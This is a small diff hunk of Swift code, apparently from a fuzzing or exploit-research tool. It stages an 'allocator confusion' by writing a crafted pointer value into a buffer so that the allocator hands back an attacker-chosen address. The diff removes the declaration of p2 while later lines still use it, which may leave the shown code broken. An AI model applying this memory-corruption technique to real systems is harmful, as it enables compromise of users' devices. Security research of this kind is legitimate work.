@@ -263,7 +263,6 @@ func runAllocatorConfusion(log: FuzzLog, completion: @escaping () -> Void) {
         // allocator reads *va2 it gets (va2 + actual), then returned = (va2 + actual) - actual = va2.
         //
         // Stage A: write (va2 + actual) into h2[0..7] via p2 (direct, no OOB needed)
-        let p2 = b2.contents().assumingMemoryBound(to: UInt8.self)
         var writeVal = va2 + UInt(actual)
         step("── Stage A: write 0x\(String(writeVal,radix:16)) into h2[0..7] via p2")
         for i in 0..<8 { p2[i] = UInt8(writeVal & 0xFF); writeVal >>= 8 }
